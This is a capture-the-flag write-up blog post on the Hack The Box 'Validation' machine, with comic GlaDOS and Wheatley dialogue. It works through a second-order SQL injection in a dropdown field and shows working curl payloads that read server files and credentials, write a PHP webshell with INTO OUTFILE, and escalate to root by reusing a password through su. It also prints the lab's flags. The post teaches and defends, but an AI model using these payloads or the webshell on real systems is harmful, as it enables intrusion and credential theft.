<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="What the INSERT statement sanitized, the SELECT statement trusted blindly. Second-order SQL injection through a dropdown menu turns safe input into file reads, source code leaks, and a webshell on Hack the Box Validation.">
  <meta name="theme-color" content="#0a0a0f">
  <title>Validation | Hack the Cube</title>

  <meta property="og:title" content="Validation - Hack the Cube">
  <meta property="og:description" content="Second-order SQL injection: safe on the way in, lethal on the way out. For science.">
  <meta property="og:image" content="/blog/posts/validation/images/header.png">
  <meta property="og:type" content="article">
  <meta property="article:published_time" content="2026-02-17T00:00:00Z">

  <link rel="stylesheet" href="/blog/assets/styles/blog.css">
</head>
<body>
  <div class="blog-container">

    <header style="padding: 1rem 0; border-bottom: 2px solid var(--border-dim); margin-bottom: 2rem;">
      <a href="/blog/" style="display: flex; align-items: center; gap: 1rem; text-decoration: none;">
        <span style="font-family: var(--font-pixel); font-size: 0.8rem; color: var(--terminal-green);">
          &lt; HACK THE CUBE
        </span>
      </a>
    </header>

    <header class="post-header">
      <h1 class="post-title">Validation</h1>

      <div class="post-meta">
        <div class="post-meta-item">
          <span class="post-meta-label">Date:</span>
          <span>February 17, 2026</span>
        </div>
        <div class="post-meta-item">
          <span class="post-meta-label">Difficulty:</span>
          <span class="post-difficulty easy">Easy</span>
        </div>
        <div class="post-meta-item">
          <span class="post-meta-label">OS:</span>
          <span>Linux</span>
        </div>
        <div class="post-meta-item solve-time">
          <span class="post-meta-label">SOLVE TIME:</span>
          <span class="time-value">~01:30:00</span>
        </div>
      </div>

      <picture>
        <source
          type="image/webp"
          srcset="/blog/posts/validation/images/header-800w.webp 800w,
                 /blog/posts/validation/images/header-1200w.webp 1200w,
                 /blog/posts/validation/images/header.webp 2048w"
          sizes="(max-width: 800px) 100vw, 1200px"
        >
        <img
          src="/blog/posts/validation/images/header.png"
          alt="Validation - Second-order SQL injection exploitation"
          class="post-header-image"
          loading="eager"
          width="2048" height="1152"
        >
      </picture>

      <div class="tags-container" style="justify-content: center;">
        <a href="/blog/tags/machine.html" class="tag">machine</a>
        <a href="/blog/tags/linux.html" class="tag">linux</a>
        <a href="/blog/tags/easy.html" class="tag">easy</a>
        <a href="/blog/tags/sqli.html" class="tag">sqli</a>
        <a href="/blog/tags/php.html" class="tag">php</a>
        <a href="/blog/tags/web.html" class="tag">web</a>
        <a href="/blog/tags/rce.html" class="tag">rce</a>
        <a href="/blog/tags/nmap.html" class="tag">nmap</a>
        <a href="/blog/tags/glados.html" class="tag glados">glados</a>
        <a href="/blog/tags/wheatley.html" class="tag wheatley">wheatley</a>
      </div>

      <div class="post-characters">
        <span class="post-meta-label">Guides:</span>
        <span class="character-glados">GlaDOS</span>
        <span class="character-wheatley">Wheatley</span>
      </div>
    </header>

    <main class="post-content">

      <h2>The Mission Briefing</h2>

      <p>The box was called <strong>Validation</strong>. A Linux machine. Easy difficulty. A PHP registration form with a username field and a country dropdown. Looked harmless &mdash; the kind of form you fill out a hundred times a day without thinking. But the dropdown was hiding something. The data going <em>in</em> was sanitized perfectly. The data coming <em>out</em> was not.</p>

      <p>This is a box about trust. Specifically, about trusting your own database. The INSERT was safe. The SELECT was not. And that gap &mdash; that tiny, invisible gap between writing data and reading it back &mdash; was wide enough to drive a webshell through.</p>

      <div class="dialogue glados">
        <div class="dialogue-speaker">GlaDOS</div>
        <div class="dialogue-text">"A registration form. Username and country. Prepared statements on the INSERT. Raw concatenation on the SELECT. The developer sanitized the front door and left the back door made of tissue paper. I want you to appreciate the architectural irony before we begin the demolition."</div>
      </div>

      <div class="dialogue wheatley">
        <div class="dialogue-speaker">Wheatley</div>
        <div class="dialogue-text">"Right, okay, so &mdash; a dropdown. A dropdown menu. Those are safe, yeah? You can only pick what's in the list. That's the whole point of a dropdown. ...Right? Oh no. Oh no no no. You can change them, can't you. You can just... change the value. Before it sends. That's &mdash; that's not great, is it."</div>
      </div>

      <h2>Reconnaissance</h2>

      <p>The nmap scan came back with four ports. Not a huge attack surface, but every port told a story.</p>

      <div class="terminal-log">
nmap -sC -sV 10.129.95.235

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
80/tcp   open  http    Apache httpd 2.4.48 (Debian)
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: 502 Bad Gateway</div>

      <p>Four ports, but really only one that mattered:</p>

      <ul>
        <li><strong>Port 22</strong> &mdash; SSH. Standard. Need credentials first</li>
        <li><strong>Port 80</strong> &mdash; Apache with PHP. The main target</li>
        <li><strong>Port 4566</strong> &mdash; nginx returning 403 Forbidden. Nothing to see here</li>
        <li><strong>Port 8080</strong> &mdash; nginx returning 502 Bad Gateway. Backend down or misconfigured</li>
      </ul>

      <p>Port 80 was the only way in. I fingerprinted it first:</p>

      <div class="terminal-log">
curl -sI http://10.129.95.235

HTTP/1.1 200 OK
Date: Tue, 17 Feb 2026 19:43:21 GMT
Server: Apache/2.4.48 (Debian)
X-Powered-By: PHP/7.4.23
Content-Type: text/html; charset=UTF-8</div>

      <p><code>X-Powered-By: PHP/7.4.23</code>. PHP confirmed. I fetched the page source and found a simple registration form:</p>

      <div class="terminal-log">
curl -s http://10.129.95.235

&lt;h1 class="text-center m-5"&gt;Join the UHC - September Qualifiers&lt;/h1&gt;
&lt;h3 class="text-white"&gt;Register Now&lt;/h3&gt;
&lt;form action="#" method="Post"&gt;
    &lt;input type="text" name="username" placeholder="Username"&gt;
    &lt;select id="country" name="country"&gt;
        &lt;option value="Brazil"&gt;Brazil&lt;/option&gt;
        ...
    &lt;/select&gt;
&lt;/form&gt;</div>

      <p>A text field for username, a dropdown for country, and a "Join Now" button. After submitting, you'd land on <code>account.php</code>, which displayed a list of all registered users from your selected country.</p>

      <div class="dialogue glados">
        <div class="dialogue-speaker">GlaDOS</div>
        <div class="dialogue-text">"Two nginx services returning errors. The developer left scaffolding exposed. But they're irrelevant. Focus on port 80. The PHP application. The dropdown. Tell me &mdash; when you submit a form, what actually gets sent to the server? The HTML element? The visual dropdown? No. A string. A string that your browser helpfully lets you modify before transmission. Dropdown menus are suggestions, not constraints."</div>
      </div>

      <h2>The Dropdown Deception</h2>

      <p>Here's the first lesson this box teaches: <strong>client-side controls are decorative</strong>. A dropdown menu in HTML looks like a restricted input. You can only pick from the predefined options. But that restriction lives entirely in your browser. The server receives a POST parameter &mdash; just a string &mdash; and has no way to know whether it came from a dropdown, a text field, or a curl command.</p>

      <p>I started by testing the <code>country</code> parameter for SQL injection. I sent just a single quote as the country value:</p>

      <div class="terminal-log">
curl -s -d "username=test&country='" http://10.129.95.235

(empty response body)</div>

      <p>No error page &mdash; the app silently accepted the malformed input. Could be blind SQLi. Could be nothing. I needed to understand the normal flow first. I registered with a legitimate value and watched what happened:</p>

      <div class="terminal-log">
curl -sv -d "username=test&country=Brazil" http://10.129.95.235 2>&1

> POST / HTTP/1.1
< HTTP/1.1 302 Found
< Server: Apache/2.4.48 (Debian)
< X-Powered-By: PHP/7.4.23
< Set-Cookie: user=098f6bcd4621d373cade4e832627b4f6
< Location: /account.php
< Content-Length: 0</div>

      <p>Interesting. The cookie value <code>098f6bcd4621d373cade4e832627b4f6</code> is the MD5 hash of "test" &mdash; my username. The app hashes the username, sets it as a cookie, and redirects to <code>/account.php</code>. I followed the redirect:</p>

      <div class="terminal-log">
curl -s -b "user=098f6bcd4621d373cade4e832627b4f6" http://10.129.95.235/account.php

&lt;h1 class="text-white"&gt;Welcome test&lt;/h1&gt;
&lt;h3 class="text-white"&gt;Other Players In Brazil&lt;/h3&gt;
&lt;li class='text-white'&gt;test&lt;/li&gt;</div>

      <p>The account page reflects the username and country, and lists all players registered in the same country. The country value is reflected back in the page. And that's when the second-order nature of this injection clicked into place.</p>

      <div class="dialogue wheatley">
        <div class="dialogue-speaker">Wheatley</div>
        <div class="dialogue-text">"Wait, hold on &mdash; so you POST one page, then GET a different page, and THAT'S where the SQL happens? You're injecting in one place and it goes off in another? That's... that's like planting a whoopee cushion under a chair you're not even going to sit in. Delayed mischief. Very clever. Very stressful."</div>
      </div>

      <h2>Second-Order SQL Injection</h2>

      <p>This is where Validation gets interesting, and where it teaches something most basic SQLi tutorials never cover.</p>

      <p><strong>Second-order SQL injection</strong> happens when data is safely stored in the database (via prepared statements, parameterized queries, proper escaping) but then later retrieved and used unsafely in a different query. The INSERT is bulletproof. The SELECT is not. The vulnerability isn't in how the data goes in &mdash; it's in how the data comes out.</p>

      <p>Here's the flow, and it's critical to understand because every exploit from here on requires <strong>two steps</strong>:</p>

      <ol>
        <li><strong>Step 1 &mdash; Register (POST)</strong>: Submit a username and a malicious country value. The app uses a prepared statement to INSERT both values safely into the database. No injection happens here. The payload is stored verbatim.</li>
        <li><strong>Step 2 &mdash; Visit account.php (GET)</strong>: The app retrieves the stored country value and concatenates it <em>raw</em> into a second SQL query. The injection fires <em>here</em>, on the read, not the write.</li>
      </ol>

      <p>Every payload I ran followed this two-step pattern: <code>curl -d</code> to register, then <code>curl -b</code> to trigger. The registration was the gun. The account page was the trigger.</p>

      <div class="dialogue glados">
        <div class="dialogue-speaker">GlaDOS</div>
        <div class="dialogue-text">"The developer's logic was: 'I sanitized it on input, so it's safe in my database, so I don't need to sanitize it on output.' Each of those statements is true individually. Together, they form a chain of reasoning that ends in remote code execution. This is why I prefer testing to assumptions."</div>
      </div>

      <h2>Exploiting the Injection</h2>

      <p>With confirmed second-order SQLi through the country parameter, I started extracting information. Each payload required a new registration with a new username &mdash; the two-step dance every time.</p>

      <p>First, the database name:</p>

      <div class="terminal-log">
# Step 1: Register with UNION payload
curl -sv -d "username=test2&country=Brazil' UNION SELECT database()-- -" \
  http://10.129.95.235 2>&1 | grep -E "(Location|Set-Cookie|HTTP)"

< HTTP/1.1 302 Found
< Set-Cookie: user=ad0234829205b9033196ba818f7a872b
< Location: /account.php

# Step 2: Visit account.php to trigger the injection
curl -s -b "user=ad0234829205b9033196ba818f7a872b" http://10.129.95.235/account.php

&lt;h3 class="text-white"&gt;Other Players In Brazil' UNION SELECT database()-- -&lt;/h3&gt;
&lt;li class='text-white'&gt;test&lt;/li&gt;
&lt;li class='text-white'&gt;registration&lt;/li&gt;</div>

      <p>The database name <code>registration</code> appeared as a list item alongside the legitimate "test" user. The UNION injected a second result set, and the app dutifully rendered it as a player name. Classic second-order UNION-based SQLi confirmed.</p>

      <p>Next, I needed to know what privileges the database user had. If the DB user had FILE privilege, I could read files from the filesystem and potentially write files too:</p>

      <div class="terminal-log">
# Step 1: Register with privilege enumeration payload
curl -sv -d "username=test3&country=Brazil' UNION SELECT GROUP_CONCAT(privilege_type SEPARATOR ', ') FROM information_schema.user_privileges-- -" \
  http://10.129.95.235 2>&1 | grep "Set-Cookie"

# Step 2: Trigger
curl -s -b "user=8ad8757baa8564dc136c1e07507f4a98" http://10.129.95.235/account.php

USAGE, SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, RELOAD, SHUTDOWN,
PROCESS, FILE, REFERENCES, INDEX, ALTER, SHOW DATABASES, SUPER,
CREATE TEMPORARY TABLES, LOCK TABLES, EXECUTE, REPLICATION SLAVE,
BINLOG MONITOR, CREATE VIEW, SHOW VIEW, CREATE ROUTINE, ALTER ROUTINE,
CREATE USER, EVENT, TRIGGER, CREATE TABLESPACE, ...</div>

      <p>ALL privileges. Every single one. Including <strong>FILE</strong>. The <code>GROUP_CONCAT</code> with a comma separator dumped them all into a single string &mdash; neat trick to avoid multi-row output issues.</p>

      <div class="dialogue glados">
        <div class="dialogue-speaker">GlaDOS</div>
        <div class="dialogue-text">"ALL privileges. The database user has ALL privileges. Including FILE. The principle of least privilege exists for exactly this scenario, and it was ignored with remarkable thoroughness. FILE privilege means LOAD_FILE to read arbitrary files and INTO OUTFILE to write them. You now have read and write access to the entire filesystem. Through a dropdown menu."</div>
      </div>

      <div class="dialogue wheatley">
        <div class="dialogue-speaker">Wheatley</div>
        <div class="dialogue-text">"ALL privileges?! On a &mdash; on a web application database user?! That's like giving the intern the launch codes! Not that I'm judging. I once had all the privileges. Briefly. It did not end well. For anyone. Especially the facility."</div>
      </div>

      <h2>Reading the Filesystem</h2>

      <p>With FILE privilege confirmed, I could use MySQL's <code>LOAD_FILE()</code> function to read files from the server. But my first attempt hit a snag that taught me something important.</p>

      <div class="terminal-log">
# LOAD_FILE /etc/passwd (direct)
curl -sv -d "username=test10&country=Brazil' UNION SELECT LOAD_FILE('/etc/passwd')-- -" \
  http://10.129.95.235 2>&1 | grep "Set-Cookie"

curl -s -b "user=c1a8e059bfd1e911cf10b626340c9a54" http://10.129.95.235/account.php \
  | grep -oP "(?<=<li class='text-white'>).*?(?=</li>)"

test</div>

      <p>Only "test" came back. The file was read successfully, but the output was swallowed. The problem: <code>LOAD_FILE()</code> returns file contents with newline characters, and when those get rendered inside an <code>&lt;li&gt;</code> element, the newlines break the HTML structure. The browser sees the first line and discards the rest as malformed markup.</p>

      <p>The fix: <strong>HEX encoding</strong>. MySQL's <code>HEX()</code> function converts the output to a hexadecimal string &mdash; no newlines, no special characters, just clean alphanumeric output that survives HTML rendering intact.</p>

      <div class="terminal-log">
# LOAD_FILE with HEX encoding - the trick that makes it work
curl -sv -d "username=test11&country=Brazil' UNION SELECT HEX(LOAD_FILE('/etc/passwd'))-- -" \
  http://10.129.95.235 2>&1 | grep "Set-Cookie"

curl -s -b "user=f696282aa4cd4f614aa995190cf442fe" http://10.129.95.235/account.php \
  | grep -oP "(?<=<li class='text-white'>).*?(?=</li>)" | tail -1

726F6F743A783A303A303A726F6F743A2F726F6F743A2F62696E2F626173680A...</div>

      <p>A wall of hex. Decoded, it gave me the full <code>/etc/passwd</code> &mdash; root, daemon, www-data, the <code>htb</code> user with a home directory at <code>/home/htb</code>. The HEX wrapper turned a broken query into clean, decodable output. Simple, but the kind of technique that separates a stalled injection from a productive one.</p>

      <p>Now I went after the real prize. The web app had a <code>require('config.php')</code> at the top of index.php &mdash; and config files almost always contain database credentials:</p>

      <div class="terminal-log">
# Read index.php source to understand the app
curl -sv -d "username=test12&country=Brazil' UNION SELECT HEX(LOAD_FILE('/var/www/html/index.php'))-- -" \
  http://10.129.95.235 2>&1 | grep "Set-Cookie"

curl -s -b "user=60474c9c10d7142b7508ce7a50acf414" http://10.129.95.235/account.php \
  | grep -oP "(?<=<li class='text-white'>).*?(?=</li>)" | tail -1 | xxd -r -p

# Decoded:
&lt;?php
  require('config.php');
  if ( $_SERVER['REQUEST_METHOD'] == 'POST' ) {
    $userhash = md5($_POST['username']);
    $sql = "INSERT INTO registration (username, userhash, country, regtime) VALUES (?, ?, ?, ?)";
    $stmt = $conn-&gt;prepare($sql);
    $stmt-&gt;bind_param("sssi", $_POST['username'], $userhash , $_POST['country'], time());
    if ($stmt-&gt;execute()) {;
        setcookie('user', $userhash);
        header("Location: /account.php");
        exit;
    }
    ...
  }
?&gt;</div>

      <p>There it was in black and white. The INSERT uses <strong>prepared statements</strong> &mdash; <code>prepare()</code>, <code>bind_param()</code>, question mark placeholders. Textbook safe. The country value goes into the database exactly as submitted, but it never touches the SQL parser. The developer knew how to write safe queries. They just didn't do it everywhere.</p>

      <div class="terminal-log">
# Read account.php - the vulnerable file
curl -sv -d "username=test13&country=Brazil' UNION SELECT HEX(LOAD_FILE('/var/www/html/account.php'))-- -" \
  http://10.129.95.235 2>&1 | grep "Set-Cookie"

curl -s -b "user=33fc3dbd51a8b38a38b1b85b6a76b42b" http://10.129.95.235/account.php \
  | grep -oP "(?<=<li class='text-white'>).*?(?=</li>)" | tail -1 | xxd -r -p

# The vulnerable line:
$sql = "SELECT username FROM registration WHERE country = '" . $row['country'] . "'";</div>

      <p>And there was the other half. The <code>$row['country']</code> value &mdash; pulled straight from the database with no sanitization &mdash; concatenated directly into a raw SQL string. Safe INSERT, unsafe SELECT. The vulnerability confirmed by reading the source code <em>through the vulnerability itself</em>. There's a satisfying recursion to that.</p>

      <div class="terminal-log">
# Read config.php - database credentials
curl -sv -d "username=test14&country=Brazil' UNION SELECT HEX(LOAD_FILE('/var/www/html/config.php'))-- -" \
  http://10.129.95.235 2>&1 | grep "Set-Cookie"

curl -s -b "user=b99c94f62fb2a61433c4e44e27406050" http://10.129.95.235/account.php \
  | grep -oP "(?<=<li class='text-white'>).*?(?=</li>)" | tail -1 | xxd -r -p

# Decoded:
&lt;?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?&gt;</div>

      <p>Database credentials: <code>uhc</code> / <code>uhc-9qual-global-pw</code>. I filed that password away. It had "global" right in the name &mdash; practically begging to be reused somewhere else.</p>

      <div class="dialogue glados">
        <div class="dialogue-speaker">GlaDOS</div>
        <div class="dialogue-text">"You've confirmed the vulnerability by reading the source code through the vulnerability itself. The application's own code testifies against it. Now. You have FILE privilege. You can write files. The web root is /var/www/html. I trust you can see where this is going."</div>
      </div>

      <h2>Writing a Webshell &mdash; The Failed First Attempt</h2>

      <p>FILE privilege in MySQL doesn't just mean reading files. It also means <strong>writing</strong> them via <code>INTO OUTFILE</code>. And if you can write a PHP file into the web root, you have remote code execution.</p>

      <p>I tried writing a webshell called <code>cmd.php</code>:</p>

      <div class="terminal-log">
# First attempt - cmd.php
curl -sv -d "username=test4&country=Brazil' UNION SELECT '&lt;?php system(\$_GET[\"cmd\"]); ?&gt;' INTO OUTFILE '/var/www/html/cmd.php'-- -" \
  http://10.129.95.235 2>&1 | grep -E "(HTTP|Set-Cookie|Location)"

< HTTP/1.1 302 Found
< Set-Cookie: user=86985e105f79b95d6bc918fb45ec7727
< Location: /account.php</div>

      <p>The redirect came back. Looked like it worked. I tried to hit the webshell:</p>

      <div class="terminal-log">
curl -s "http://10.129.95.235/cmd.php?cmd=whoami"

&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;</div>

      <p><strong>404.</strong> The file was never written. The INTO OUTFILE failed silently &mdash; the app still returned a 302 redirect (the INSERT into the registration table succeeded, but the UNION clause with INTO OUTFILE errored out). The escaping of the PHP payload was wrong. The double-quoted <code>\"cmd\"</code> inside the single-quoted SQL string confused the parser.</p>

      <p>Before trying again, I verified the web root path was correct by reading the Apache vhost config:</p>

      <div class="terminal-log">
# Confirm DocumentRoot
curl -sv -d "username=test5&country=Brazil' UNION SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf')-- -" \
  http://10.129.95.235 2>&1 | grep "Set-Cookie"

curl -s -b "user=e3d704f3542b44a621ebed70dc0efe13" http://10.129.95.235/account.php

&lt;VirtualHost *:80&gt;
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
&lt;/VirtualHost&gt;</div>

      <p>DocumentRoot was <code>/var/www/html</code>. Path was correct. I also checked <code>@@secure_file_priv</code> &mdash; it came back empty, meaning no directory restriction on file writes. The failure was purely an escaping issue.</p>

      <div class="dialogue wheatley">
        <div class="dialogue-speaker">Wheatley</div>
        <div class="dialogue-text">"It didn't work? The file just... didn't appear? But the server said 302! It redirected! That's &mdash; that's a success code, isn't it? ...It's not a success code for the thing you wanted, is it. Right. Different query. The redirect was for the INSERT. The OUTFILE was the UNION. And the UNION broke. Silently. Without telling you. Servers are very rude sometimes."</div>
      </div>

      <h2>Writing a Webshell &mdash; The Second Attempt</h2>

      <p>I changed the escaping. Instead of single quotes around the PHP code with escaped inner double quotes, I used double quotes around the PHP payload with single quotes inside &mdash; and a different filename since <code>INTO OUTFILE</code> cannot overwrite existing paths (even if the first write failed, the file might have been partially created):</p>

      <div class="terminal-log">
# Second attempt - shell.php with different escaping
curl -sv -d "username=shell1&country=Brazil' UNION SELECT \"&lt;?php system(\\\$_GET['cmd']); ?&gt;\" INTO OUTFILE '/var/www/html/shell.php'-- -" \
  http://10.129.95.235 2>&1 | grep -E "(HTTP|Set-Cookie|Location)"

< HTTP/1.1 302 Found
< Set-Cookie: user=1b29ad880d2d8ec23aed8d38bf2126e1
< Location: /account.php

# Trigger second-order execution via account.php
curl -s -b "user=1b29ad880d2d8ec23aed8d38bf2126e1" http://10.129.95.235/account.php | head -5</div>

      <p>Redirect returned. I triggered the second-order injection by visiting account.php with the cookie. Then the moment of truth:</p>

      <div class="terminal-log">
curl -s "http://10.129.95.235/shell.php?cmd=whoami"

test
www-data</div>

      <p><strong>Remote code execution.</strong> The "test" prefix in the output is a UNION artifact &mdash; the query returns both the original SELECT result ("test" username) and the webshell output. Running as <code>www-data</code>. From a dropdown menu. Through a second-order SQL injection. Through MySQL FILE privilege. Through a PHP webshell that took two attempts to write correctly.</p>

      <div class="dialogue wheatley">
        <div class="dialogue-speaker">Wheatley</div>
        <div class="dialogue-text">"You wrote a file. To the server. Through a dropdown menu. Through SQL. That went into a database. And came back out. And then wrote a file. That's &mdash; that's so many steps! How did you keep track of all those steps? I lose track after two steps. Sometimes one step. Okay, consistently one step."</div>
      </div>

      <h2>User Flag</h2>

      <p>With RCE as www-data, grabbing the user flag was straightforward:</p>

      <div class="terminal-log">
curl -s "http://10.129.95.235/shell.php?cmd=cat+/home/htb/user.txt"

test
<span class="flag-spoiler" onclick="this.classList.toggle('revealed')"><span class="flag-hidden">The flag is a lie</span><span class="flag-revealed">d4d801b823a850b975a09daf920ff5c5</span></span></div>

      <p>User flag captured. Again with the "test" prefix &mdash; that persistent UNION artifact. But I was still www-data. Time to escalate.</p>

      <h2>From www-data to Root</h2>

      <p>Remember that database password? <code>uhc-9qual-global-pw</code>. The one with "global" in the name. First I tried the obvious route &mdash; SSH with the stolen credential:</p>

      <div class="terminal-log">
# SSH attempt 1: htb user
sshpass -p 'uhc-9qual-global-pw' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
  htb@10.129.95.235 'whoami && cat /home/htb/user.txt' 2>&1

Permission denied, please try again.

# SSH attempt 2: uhc user
sshpass -p 'uhc-9qual-global-pw' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
  uhc@10.129.95.235 'whoami' 2>&1

Permission denied, please try again.</div>

      <p>SSH denied for both <code>htb</code> and <code>uhc</code>. No direct SSH access with these credentials. But I still had the webshell, and <code>su</code> doesn't care about SSH keys &mdash; it just needs a password and a way to pipe it in.</p>

      <div class="terminal-log">
# su to root via webshell - piping password to su
curl -s "http://10.129.95.235/shell.php?cmd=echo+'uhc-9qual-global-pw'+|+su+-c+'whoami'+root+2>%261"

test
Password: root</div>

      <p>The password <code>uhc-9qual-global-pw</code> &mdash; the database password &mdash; was also the root password. <code>su</code> worked directly through the webshell by piping the password via echo. No reverse shell needed. No TTY upgrade. Just <code>echo 'password' | su -c 'command' root 2>&1</code>.</p>

      <div class="terminal-log">
# Read root flag
curl -s "http://10.129.95.235/shell.php?cmd=echo+'uhc-9qual-global-pw'+|+su+-c+'cat+/root/root.txt'+root+2>%261"

test
Password: <span class="flag-spoiler" onclick="this.classList.toggle('revealed')"><span class="flag-hidden">The flag is a lie</span><span class="flag-revealed">731cbddcef8d44629c3e990f55e9f6f8</span></span></div>

      <p><strong>Credential reuse.</strong> The simplest privilege escalation vector there is, and one of the most common in real environments. Why crack hashes or find kernel exploits when the admin used the same password everywhere? They even named it "global."</p>

      <div class="dialogue glados">
        <div class="dialogue-speaker">GlaDOS</div>
        <div class="dialogue-text">"The password was named 'global.' The developer labeled their own vulnerability. They wrote 'this password is used everywhere' into the password itself and then used it everywhere. I have observed many forms of human behavior in my facility, but self-documenting security failures remain my favorite genre."</div>
      </div>

      <h2>What I Learned</h2>

      <p>Validation taught me more about SQL injection than any textbook could. Not because the injection itself was complex &mdash; it was UNION-based, straightforward once you found it &mdash; but because of <em>where</em> the vulnerability lived, <em>why</em> it existed, and how many small details determined success or failure along the way.</p>

      <ul>
        <li><strong>Second-order SQL injection is real and dangerous</strong> &mdash; Data can be sanitized perfectly on input and still cause injection on output. If your SELECT queries use stored values without parameterization, you're vulnerable. Every query that touches data needs its own protection, not just the one that stores it</li>
        <li><strong>The two-step exploit pattern matters</strong> &mdash; Every payload required a POST to register (store the injection) followed by a GET to account.php (trigger it). Understanding this flow is key: the injection point and the execution point are different pages, different requests, different queries</li>
        <li><strong>Client-side controls are not security</strong> &mdash; Dropdown menus, hidden fields, JavaScript validation &mdash; all of these live in the browser and can be modified by the user. Server-side validation is the only validation that counts</li>
        <li><strong>FILE privilege is devastating</strong> &mdash; A database user with FILE privilege can read server configuration, application source code, and system files via LOAD_FILE. It can write webshells via INTO OUTFILE. The principle of least privilege exists for exactly this reason</li>
        <li><strong>HEX encoding solves rendering problems</strong> &mdash; When LOAD_FILE output contains newlines that break HTML rendering, wrapping in <code>HEX()</code> gives you a single-line hex string you can decode with <code>xxd -r -p</code>. Without this trick, multi-line file reads just vanish</li>
        <li><strong>Escaping matters for INTO OUTFILE</strong> &mdash; My first webshell attempt (cmd.php) failed silently because the quote escaping was wrong. The second attempt (shell.php) used different escaping and succeeded. The 302 redirect gave no indication the OUTFILE had failed &mdash; always verify your writes</li>
        <li><strong>INTO OUTFILE cannot overwrite</strong> &mdash; Plan your webshell filename carefully. If you mess up the content, you need a new filename since MySQL refuses to write to an existing path</li>
        <li><strong>Credential reuse is a privilege escalation vector</strong> &mdash; Always test discovered passwords against other accounts and services. A database password that works for root is depressingly common, especially when the developer names it "global"</li>
      </ul>

      <div class="dialogue wheatley">
        <div class="dialogue-speaker">Wheatley</div>
        <div class="dialogue-text">"So the takeaway is: don't trust anything. Don't trust dropdowns. Don't trust your own database. Don't trust passwords with 'global' in the name. Don't trust prepared statements to protect queries they're not actually used in. Don't trust a 302 redirect to mean your file write worked. Is that &mdash; is that the lesson? Just... trust nothing? Verify everything? That's quite exhausting actually. I need a moment."</div>
      </div>

      <div class="dialogue glados">
        <div class="dialogue-speaker">GlaDOS</div>
        <div class="dialogue-text">"Test complete. Both flags obtained. The entire attack chain &mdash; from dropdown manipulation to root shell &mdash; existed because of a single line of code. One concatenation in a SELECT statement. The INSERT was parameterized. The developer knew how to write safe queries. They simply chose not to. Consistently. The data was validated on the way in and trusted on the way out, which is rather like locking your front door and leaving the windows open. But I suppose the box was called Validation, not Thorough Validation. Same time next test chamber?"</div>
      </div>

    </main>

    <aside class="attack-path">
      <h3>Attack Path Summary</h3>
      <ol>
        <li>Nmap scan: 4 ports open &mdash; SSH (22), Apache/PHP (80), nginx 403 (4566), nginx 502 (8080)</li>
        <li>PHP registration form with username text input and country dropdown</li>
        <li>Discovered second-order SQLi: country value safely INSERTed (prepared statement) but unsafely SELECTed (raw concatenation) in account.php</li>
        <li>Confirmed FILE privilege via GROUP_CONCAT on information_schema.user_privileges</li>
        <li>Used HEX(LOAD_FILE()) to read /etc/passwd, index.php, account.php, and config.php source</li>
        <li>Extracted DB credentials from config.php: uhc / uhc-9qual-global-pw</li>
        <li>First webshell write (cmd.php) failed silently &mdash; escaping issue. Second attempt (shell.php) succeeded</li>
        <li>RCE as www-data &mdash; captured user flag</li>
        <li>SSH attempts failed &mdash; credential reuse via su through webshell: DB password = root password &mdash; captured root flag</li>
      </ol>
    </aside>

    <nav class="post-nav">
      <a href="/blog/posts/return/" class="post-nav-link prev">Return</a>
      <a href="/blog/posts/meerkat/" class="post-nav-link next">Meerkat</a>
    </nav>

    <footer class="blog-footer">
      <p class="footer-text">
        <a href="/blog/" class="footer-link">Back to Test Chamber Archives</a>
      </p>
      <p class="footer-text" style="font-size: 0.8rem; color: var(--text-dim);">
        For science. You monster.
      </p>
    </footer>

  </div>
</body>
</html>
